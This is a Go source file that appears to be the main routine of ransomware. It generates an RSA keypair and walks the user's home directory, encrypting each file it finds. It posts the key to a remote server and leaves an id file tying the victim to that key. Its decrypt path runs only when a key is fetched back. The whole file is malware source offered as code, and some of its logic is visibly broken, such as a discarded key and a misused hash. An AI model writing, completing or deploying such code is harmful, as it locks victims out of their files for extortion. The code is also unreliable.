package main

import (
	"fmt"

	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/hex"
	"io/ioutil"
	"os"
	"strings"
)

// GenID generates unique indetitifer

func GenerateID() string {
	r := make([]byte, 32)
	rand.Read(r)

	hash := sha256.New()

	return hex.EncodeToString(hash.Sum(r))
}

func main() {
	idFile, err := os.Open("id.txt")

	var priv *rsa.PrivateKey
	shouldEncrypt := false

	// Filke exists, read id and get key from server
	if err == nil {
		idBytes, err := ioutil.ReadAll(idFile)
		idFile.Close()

		if err != nil {
			panic(err)
		}

		id := string(idBytes)
		id = strings.Split(id, "\r\n")[1]

		GetKey(id)
	} else {
		fmt.Println("generating keypair....")
		priv = Generate()
		shouldEncrypt = true
	}

	fmt.Println()
	fmt.Println(Stringify(priv))

	startWalk := GetHomeDir()

	Walk(startWalk, func(filePath string, fileInfo os.FileInfo, isEncrypted bool) {
		fmt.Println(filePath, "encrypted", isEncrypted)

		if shouldEncrypt && !isEncrypted {
			encrypt(filePath, priv)
		} else if isEncrypted {
			decrypt(filePath, priv)
		}
	})

	if shouldEncrypt {
		id := GenerateID()

		PostKey(priv, id)

		data := "# Dont modify file, contains ID matching encryption key\r\n" + id

		ioutil.WriteFile("id.txt", []byte(data), 0777)

	}
}
